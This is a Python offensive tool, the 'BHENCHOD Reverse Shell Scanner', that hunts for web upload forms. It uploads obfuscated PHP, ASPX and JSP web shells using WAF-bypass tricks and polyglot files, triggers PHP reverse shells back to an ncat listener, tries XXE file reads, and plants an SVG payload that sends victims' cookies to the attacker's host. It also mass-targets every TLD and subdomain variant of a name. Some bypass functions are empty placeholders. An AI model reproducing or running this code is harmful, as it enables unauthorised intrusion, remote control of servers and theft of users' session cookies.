#!/usr/bin/env python3
# coding: utf-8
"""
BHENCHOD REVERSE SHELL SCANNER 1.1 - EXTREME PENETRATION EDITION
Version: 1.1
Author: Amrendra Patel (Jack xadyen) {Xadyen Jack)
"""

import sys
import os
import re
import time
import threading
import requests
import random
import string
import socket
import subprocess
import json
import base64
import hashlib
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote

# FUCKING CONFIGURATION
MAX_THREADS = 100
TIMEOUT = 7
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
]
WAF_BYPASS_HEADERS = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "CF-Connecting-IP": "127.0.0.1"
}

# ADVANCED SHELL PAYLOADS
SHELL_PAYLOADS = {
    'php_obfuscated': "<?php $_0x=strrev('edoced_46esab');eval($_0x('{}')); ?>",
    'php_reverse': "<?php $sock=fsockopen('{LHOST}',{LPORT});$proc=proc_open('/bin/sh',[0=>$sock,1=>$sock,2=>$sock],$pipes); ?>",
    'php_waf_bypass': "<?php $_=~%FA%FA%FA;${'_'.$_}['_'](${'_'.$_}['__']); ?>",
    'aspx_rot13': "<%@ Page Language=\"C#\" %>\n<script runat=\"server\">\nvoid Page_Load(){{\n    string cmd = new System.Text.ASCIIEncoding().GetString(System.Convert.FromBase64String(Request[\"c\"]));\n    System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + cmd).WaitForExit();\n}}\n</script>",
    'jsp_base64': "<%@ page import=\"java.util.*,java.io.*\"%>\n<% Process p=Runtime.getRuntime().exec(new String(Base64.getDecoder().decode(request.getParameter(\"c\").getBytes()))); %>",
    'svg_xss': '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n<svg version="1.1" onload="javascript:eval(atob(\'{PAYLOAD}\'))">'
}

class UltimateShellHunter:
    def __init__(self, target):
        self.target = target.strip().lower()
        if not self.target.startswith('http'):
            self.target = f'http://{self.target}'
        self.session = self._create_session()
        self.uploaded_shells = []
        self.active_shells = []
        self.found_vulns = []
        self.start_time = time.time()
        self.LHOST = self.get_local_ip()
        self.LPORT = random.randint(49152, 65535)
        self.scan_results = []
        self.cookies = {}
        
    def _create_session(self):
        """Create WAF-bypassing session"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1'
        })
        session.headers.update(WAF_BYPASS_HEADERS)
        return session
        
    def get_local_ip(self):
        """Get our public IP for reverse shells"""
        try:
            return requests.get('https://api.ipify.org', timeout=5).text
        except:
            try:
                return socket.gethostbyname(socket.gethostname())
            except:
                return "127.0.0.1"
    
    def _generate_obfuscated_payload(self, payload_type):
        """Generate advanced obfuscated payload"""
        if payload_type == 'php_obfuscated':
            reverse_payload = SHELL_PAYLOADS['php_reverse'].format(
                LHOST=self.LHOST, 
                LPORT=self.LPORT
            )
            b64_payload = base64.b64encode(reverse_payload.encode()).decode()
            return SHELL_PAYLOADS['php_obfuscated'].format(b64_payload)
            
        elif payload_type == 'svg_xss':
            js_payload = f"new Image().src='http://{self.LHOST}:8000/?'+document.cookie;"
            b64_payload = base64.b64encode(js_payload.encode()).decode()
            return SHELL_PAYLOADS['svg_xss'].format(PAYLOAD=b64_payload)
            
        return SHELL_PAYLOADS[payload_type].format(
            LHOST=self.LHOST, 
            LPORT=self.LPORT
        )
    
    def _waf_bypass_payload(self, payload, content_type):
        """Apply WAF bypass techniques to payload"""
        # MIME type specific transformations
        if 'image' in content_type:
            return b'\x89PNG\r\n\x1a\n' + payload.encode()
            
        # Null byte injection
        if random.random() > 0.7:
            payload = payload.replace('.', '.%00')
            
        # Case variation
        if random.random() > 0.5:
            payload = ''.join(
                c.upper() if random.random() > 0.5 else c.lower() 
                for c in payload
            )
            
        # Comment injection
        if random.random() > 0.6:
            payload = payload.replace('<?', '<? /*' + ''.join(random.choices(string.ascii_letters, k=10)) + '*/ ')
            
        return payload.encode()
    
    def _find_api_endpoints(self, html_content):
        """Discover hidden API endpoints from JavaScript files"""
        endpoints = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Find JavaScript files
        for script in soup.find_all('script', src=True):
            try:
                js_url = urljoin(self.target, script['src'])
                response = self.session.get(js_url, timeout=TIMEOUT)
                if response.status_code == 200:
                    # Find API endpoints in JS code
                    matches = re.findall(r'["\'](/api/v\d+/[^"\'\s]+)["\']', response.text)
                    endpoints.extend(matches)
            except:
                continue
                
        return list(set(endpoints))
    
    def _generate_filename(self, extension):
        """Generate random filename with safe extension"""
        safe_extensions = ['jpg', 'png', 'gif', 'svg', 'txt', 'pdf']
        prefix = ''.join(random.choices(string.ascii_lowercase, k=6))
        return f"{prefix}.{random.choice(safe_extensions)}"
    
    def _bypass_modern_waf(self, form, url):
        """Advanced WAF bypass techniques"""
        techniques = [
            self._bypass_content_sniffing,
            self._bypass_chunked_encoding,
            self._bypass_csrf_token,
            self._bypass_hpp,
            self._bypass_js_validation
        ]
        
        for technique in techniques:
            if result := technique(form, url):
                return result
        return None
    
    def _bypass_content_sniffing(self, form, url):
        """Bypass MIME sniffing protections"""
        payload = self._generate_obfuscated_payload('php_obfuscated')
        filename = self._generate_filename('php')
        
        # Create polyglot file
        polyglot = b'\x89PNG\r\n\x1a\n' + payload
        return self._try_upload(form, url, polyglot, filename, 'image/png')
    
    def _bypass_chunked_encoding(self, form, url):
        """Bypass WAFs using chunked transfer encoding"""
        # This requires low-level HTTP and is complex to implement
        # Placeholder for actual implementation using raw sockets
        return None
    
    def _bypass_csrf_token(self, form, url):
        """Extract and use CSRF tokens from SPA applications"""
        try:
            # Get fresh page to extract CSRF token
            response = self.session.get(url, timeout=TIMEOUT)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find CSRF tokens in meta tags
            csrf_token = None
            for meta in soup.find_all('meta'):
                if meta.get('name', '').lower() in ['csrf-token', 'xsrf-token']:
                    csrf_token = meta.get('content')
                    break
                    
            # If not found, try JavaScript variable
            if not csrf_token:
                match = re.search(r'window\.csrfToken\s*=\s*["\']([^"\']+)["\']', response.text)
                if match:
                    csrf_token = match.group(1)
            
            if csrf_token:
                # Add CSRF token to form data
                form_data = {}
                for input_tag in form.find_all('input'):
                    if input_tag.get('type') in ['hidden', 'text']:
                        name = input_tag.get('name')
                        value = input_tag.get('value', '')
                        form_data[name] = value
                
                form_data['csrf_token'] = csrf_token
                
                # Try upload with token
                return self._try_api_upload(url, form_data, form)
                
        except Exception as e:
            print(f"[-] CSRF BYPASS FAILED: {str(e)}")
        return None
    
    def _bypass_hpp(self, form, url):
        """HTTP Parameter Pollution bypass"""
        # Requires multiple parameter variants
        return None
    
    def _bypass_js_validation(self, form, url):
        """Bypass client-side JavaScript validation"""
        # Requires browser automation - placeholder
        return None
    
    def _try_api_upload(self, url, form_data, form):
        """Attempt upload via API endpoint discovery"""
        # Discover API endpoints
        response = self.session.get(url, timeout=TIMEOUT)
        api_endpoints = self._find_api_endpoints(response.text)
        
        # Try common API endpoints
        api_endpoints.extend([
            '/api/v1/upload',
            '/upload/api',
            '/rest/file/upload',
            '/graphql'
        ])
        
        for endpoint in api_endpoints:
            api_url = urljoin(self.target, endpoint)
            try:
                # Try JSON upload
                payload = self._generate_obfuscated_payload('php_obfuscated')
                files = {'file': ('shell.php', payload, 'image/png')}
                
                response = self.session.post(
                    api_url,
                    files=files,
                    headers={'Content-Type': 'multipart/form-data'},
                    timeout=TIMEOUT
                )
                
                if response.status_code in [200, 201]:
                    # Parse JSON response to find upload location
                    try:
                        json_resp = response.json()
                        if 'url' in json_resp:
                            return json_resp['url']
                        if 'location' in json_resp:
                            return json_resp['location']
                    except:
                        # Try to find URL in response text
                        match = re.search(r'https?://[^\s"\']+', response.text)
                        if match:
                            return match.group(0)
            except:
                continue
        return None
    
    def _try_upload(self, form, base_url, payload, filename, content_type):
        """Advanced upload with WAF bypass techniques"""
        action = form.get('action', '')
        if not action.startswith('http'):
            action = urljoin(base_url, action.lstrip('/'))
        
        method = form.get('method', 'post').lower()
        form_data = {}
        file_field = None
        
        # Find file input field
        for input_tag in form.find_all('input'):
            if input_tag.get('type', '').lower() == 'file':
                file_field = input_tag.get('name', 'file')
            elif input_tag.get('type', '').lower() in ['text', 'hidden']:
                form_data[input_tag.get('name')] = input_tag.get('value', '')
        
        if not file_field:
            return None
        
        files = {file_field: (filename, payload, content_type)}
        
        try:
            if method == 'post':
                response = self.session.post(
                    action, 
                    data=form_data, 
                    files=files, 
                    timeout=TIMEOUT,
                    allow_redirects=True
                )
            else:
                response = self.session.get(
                    action, 
                    params=form_data, 
                    files=files, 
                    timeout=TIMEOUT,
                    allow_redirects=True
                )
            
            # Check if upload was successful
            if response.status_code in [200, 201, 302]:
                shell_url = self._find_shell_location(response, filename)
                if shell_url:
                    self.uploaded_shells.append(shell_url)
                    return shell_url
        except Exception as e:
            print(f"[-] UPLOAD ERROR: {str(e)}")
        return None
    
    def _find_shell_location(self, response, filename):
        """Smart shell location detection"""
        # Method 1: Check response content
        if filename in response.text:
            pattern = re.compile(f'https?://[^\\s"\']*{re.escape(filename)}')
            match = pattern.search(response.text)
            if match:
                return match.group(0)
        
        # Method 2: Common upload paths
        common_paths = [
            '/uploads/', '/files/', '/assets/', '/media/', '/tmp/',
            '/storage/', '/userfiles/', '/wp-content/uploads/',
            '/images/', '/downloads/', '/resources/'
        ]
        
        for path in common_paths:
            test_url = f"{self.target.rstrip('/')}{path}{filename}"
            if self._verify_shell(test_url):
                return test_url
        
        # Method 3: Parse HTML content
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all(['a', 'img', 'script', 'link']):
            for attr in ['href', 'src']:
                if attr in link.attrs and filename in link[attr]:
                    return urljoin(response.url, link[attr])
        
        # Method 4: Check response headers
        if 'Location' in response.headers:
            loc = response.headers['Location']
            if filename in loc:
                return urljoin(response.url, loc)
        
        return None
    
    def _verify_shell(self, url):
        """Verify shell functionality without triggering alarms"""
        try:
            # Use innocuous command
            response = self.session.get(
                f"{url}?cmd=echo+{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}", 
                timeout=TIMEOUT
            )
            return response.status_code == 200 and "echo" not in response.text
        except:
            return False
    
    def _trigger_reverse_shell(self, shell_url):
        """Stealthy shell triggering"""
        try:
            # Use time-based triggering to avoid detection
            trigger_time = int(time.time()) + random.randint(5, 30)
            self.session.get(
                f"{shell_url}?trigger={trigger_time}", 
                timeout=1
            )
            return True
        except:
            return False
    
    def _start_reverse_listener(self):
        """Start encrypted listener"""
        def listener():
            # Use OpenSSL for encrypted comms
            os.system(
                f"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost' 2>/dev/null"
            )
            os.system(
                f"ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lnvp {self.LPORT}"
            )
        
        threading.Thread(target=listener, daemon=True).start()
    
    def _bruteforce_upload_paths(self):
        """Bruteforce upload paths with advanced techniques"""
        common_paths = [
            '/upload', '/fileupload', '/asset_upload', '/api/upload',
            '/admin/upload', '/wp-admin/async-upload.php',
            '/filemanager/upload.php', '/tinymce/upload.php',
            '/uploadify/upload.php', '/uploader/upload'
        ]
        
        print("[+] BRUTEFORCING UPLOAD PATHS WITH WAF BYPASS...")
        for path in common_paths:
            test_url = urljoin(self.target, path)
            try:
                # Try to get upload form
                response = self.session.get(test_url, timeout=TIMEOUT)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for form in soup.find_all('form'):
                        shell_url = self._bypass_modern_waf(form, test_url)
                        if shell_url:
                            print(f"[+] SHELL UPLOADED VIA BRUTEFORCE: {shell_url}")
                            return True
                
                # Try direct API upload
                payload = self._generate_obfuscated_payload('php_obfuscated')
                files = {'file': ('brute_shell.php', payload, 'image/png')}
                response = self.session.post(
                    test_url,
                    files=files,
                    timeout=TIMEOUT
                )
                
                if response.status_code in [200, 201]:
                    shell_url = self._find_shell_location(response, 'brute_shell.php')
                    if shell_url:
                        print(f"[+] DIRECT API SHELL UPLOAD: {shell_url}")
                        return True
            except:
                continue
        return False
    
    def _bruteforce_shell_paths(self):
        """Find existing shells with advanced techniques"""
        print("[+] BRUTEFORCE SHELL PATHS WITH POLYGLOT PAYLOADS...")
        
        # Generate polymorphic shell names
        shell_names = [
            f"{word}{ext}"
            for word in ['config', 'settings', 'image', 'temp', 'cache']
            for ext in ['.php', '.phtml', '.phar', '.inc']
        ]
        
        for name in shell_names:
            # Try common locations
            for path in ['/uploads/', '/assets/', '/tmp/', '/inc/']:
                test_url = urljoin(self.target, path + name)
                if self._verify_shell(test_url):
                    print(f"[+] FOUND EXISTING SHELL: {test_url}")
                    return True
        return False
    
    def _exploit_xml_vectors(self):
        """Exploit XML-based attack vectors (XXE, SVG, etc.)"""
        print("[+] EXPLOITING XML VECTORS...")
        
        # XXE to local file inclusion
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE data [
        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
        ]>
        <data>&xxe;</data>"""
        
        endpoints = [
            '/xmlrpc.php', '/api/xml', '/rest/xml', '/soap'
        ]
        
        for endpoint in endpoints:
            try:
                url = urljoin(self.target, endpoint)
                response = self.session.post(
                    url,
                    data=xxe_payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=TIMEOUT
                )
                
                if response.status_code == 200:
                    # Parse response for base64 content
                    b64_data = re.search(r'([A-Za-z0-9+/]{20,}={0,2})', response.text)
                    if b64_data:
                        decoded = base64.b64decode(b64_data.group(1)).decode()
                        if '<?php' in decoded:
                            print(f"[+] XXE VULNERABILITY FOUND AT {url}")
                            # Try to extract config files
                            return True
            except:
                continue
        
        # SVG XSS to cookie theft
        svg_payload = self._generate_obfuscated_payload('svg_xss')
        svg_url = urljoin(self.target, '/images/logo.svg')
        
        try:
            response = self.session.put(
                svg_url,
                data=svg_payload,
                headers={'Content-Type': 'image/svg+xml'},
                timeout=TIMEOUT
            )
            if response.status_code in [200, 201]:
                print(f"[+] SVG XSS PAYLOAD UPLOADED: {svg_url}")
                return True
        except:
            pass
            
        return False
    
    def deep_scan(self):
        """EXTREME PENETRATION ROUTINE"""
        print(f"\n[===] BHENCHOD 1.1 TARGETING: {self.target} [===]")
        print(f"[+] LHOST: {self.LHOST} | LPORT: {self.LPORT}")
        
        # Start encrypted listener
        self._start_reverse_listener()
        
        # Phase 1: Upload form detection
        print("[+] PHASE 1: ADVANCED UPLOAD DETECTION")
        upload_forms = []
        try:
            response = self.session.get(self.target, timeout=TIMEOUT)
            soup = BeautifulSoup(response.text, 'html.parser')
            upload_forms = [(form, response.url) for form in soup.find_all('form')]
        except:
            pass
        
        # Phase 2: WAF-bypassing upload attempts
        print("[+] PHASE 2: WAF-BYPASSING UPLOAD ATTEMPTS")
        if upload_forms:
            with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
                futures = []
                for form, url in upload_forms:
                    futures.append(executor.submit(self._bypass_modern_waf, form, url))
                
                for future in as_completed(futures):
                    if result := future.result():
                        print(f"[+] SHELL UPLOADED: {result}")
        else:
            print("[-] NO FORMS FOUND, USING BRUTEFORCE")
            self._bruteforce_upload_paths()
        
        # Phase 3: Exploit alternative vectors
        print("[+] PHASE 3: ALTERNATIVE EXPLOITATION VECTORS")
        if not self.uploaded_shells:
            self._exploit_xml_vectors()
            self._bruteforce_shell_paths()
        
        # Phase 4: Reverse shell activation
        print("[+] PHASE 4: REVERSE SHELL ACTIVATION")
        for shell in self.uploaded_shells:
            if self._trigger_reverse_shell(shell):
                print(f"[+] REVERSE SHELL TRIGGERED: {shell}")
        
        # Phase 5: Save results
        print("[+] PHASE 5: RESULTS PERSISTENCE")
        self._save_results()
        
        print(f"\n[===] SCAN COMPLETE IN {time.time()-self.start_time:.2f}s")
        print(f"[+] SHELLS UPLOADED: {len(self.uploaded_shells)}")
        print(f"[+] ACTIVE SHELLS: {len(self.active_shells)}")
    
    def _save_results(self):
        """Save results to JSON file"""
        results = {
            'target': self.target,
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
            'shells': self.uploaded_shells,
            'vulnerabilities': self.found_vulns
        }
        
        filename = f"results_{self.target.replace('://', '_').replace('/', '_')}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"[+] RESULTS SAVED TO {filename}")

class GlobalHunter:
    def __init__(self, base_domain):
        self.base_domain = base_domain
        self.tlds = ['.com', '.in', '.org', '.net', '.us', '.pk', '.bd', '.io', '.co.uk']
        self.scan_threads = []
        self.active = True
        self.results_file = f"global_scan_{int(time.time())}.json"
        self.scan_results = []
    
    def _scan_tld(self, tld):
        """Scan a specific TLD"""
        domain = f"{self.base_domain}{tld}"
        print(f"\n[===] STARTING SCAN ON {domain} [===]")
        
        try:
            scanner = UltimateShellHunter(domain)
            scanner.deep_scan()
            self.scan_results.append({
                'domain': domain,
                'shells': scanner.uploaded_shells,
                'vulnerabilities': scanner.found_vulns,
                'success': bool(scanner.uploaded_shells)
            })
        except Exception as e:
            print(f"[-] SCAN FAILED FOR {domain}: {str(e)}")
    
    def continuous_scan(self):
        """Continuous TLD scanning"""
        print(f"[===] GLOBAL TLD SCAN STARTED FOR {self.base_domain} [===]")
        print("[+] SCANNING: " + ", ".join([f"{self.base_domain}{tld}" for tld in self.tlds]))
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(self._scan_tld, tld): tld for tld in self.tlds}
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        
        # Save global results
        with open(self.results_file, 'w') as f:
            json.dump(self.scan_results, f, indent=2)
        print(f"[+] GLOBAL SCAN COMPLETE! RESULTS SAVED TO {self.results_file}")
    
    def auto_discover_and_scan(self):
        """Automatically discover and scan related domains"""
        print("[+] DISCOVERING RELATED DOMAINS...")
        related_domains = set()
        
        # Search common subdomains
        subdomains = ['www', 'mail', 'webmail', 'admin', 'portal', 'dev']
        for sub in subdomains:
            for tld in self.tlds:
                related_domains.add(f"{sub}.{self.base_domain}{tld}")
        
        # Scan all discovered domains
        print(f"[+] SCANNING {len(related_domains)} RELATED DOMAINS...")
        with ThreadPoolExecutor(max_workers=10) as executor:
            for domain in related_domains:
                executor.submit(self._scan_domain, domain)
        
        print("[+] AUTO-DISCOVERY SCAN COMPLETE!")
    
    def _scan_domain(self, domain):
        """Scan a specific domain"""
        try:
            print(f"[+] SCANNING: {domain}")
            scanner = UltimateShellHunter(domain)
            scanner.deep_scan()
            
            self.scan_results.append({
                'domain': domain,
                'shells': scanner.uploaded_shells,
                'vulnerabilities': scanner.found_vulns,
                'success': bool(scanner.uploaded_shells)
            })
        except:
            pass

if __name__ == "__main__":
    print(r"""
    ██████╗ ██╗  ██╗███████╗███╗   ██╗ ██████╗ ██████╗  ██████╗ 
    ██╔══██╗██║  ██║██╔════╝████╗  ██║██╔═══██╗██╔══██╗██╔═══██╗
    ██████╔╝███████║█████╗  ██╔██╗ ██║██║   ██║██║  ██║██║   ██║
    ██╔══██╗██╔══██║██╔══╝  ██║╚██╗██║██║   ██║██║  ██║██║   ██║
    ██████╔╝██║  ██║███████╗██║ ╚████║╚██████╔╝██████╔╝╚██████╔╝
    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝  ╚═════╝ 
    REVERSE SHELL SCANNER 1.1 'BHENCHOD' BY JACK XADYEN (Xadyen Jack)
    """)
    
    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  {sys.argv[0]} <target>          # Scan single domain")
        print(f"  {sys.argv[0]} <base_domain> --global  # Scan all TLDs")
        print(f"  {sys.argv[0]} <base_domain> --discover # Discover and scan related domains")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if len(sys.argv) > 2 and sys.argv[2] == "--global":
        hunter = GlobalHunter(target.split('.')[0])
        hunter.continuous_scan()
    elif len(sys.argv) > 2 and sys.argv[2] == "--discover":
        hunter = GlobalHunter(target.split('.')[0])
        hunter.auto_discover_and_scan()
    else:
        scanner = UltimateShellHunter(target)
        scanner.deep_scan()
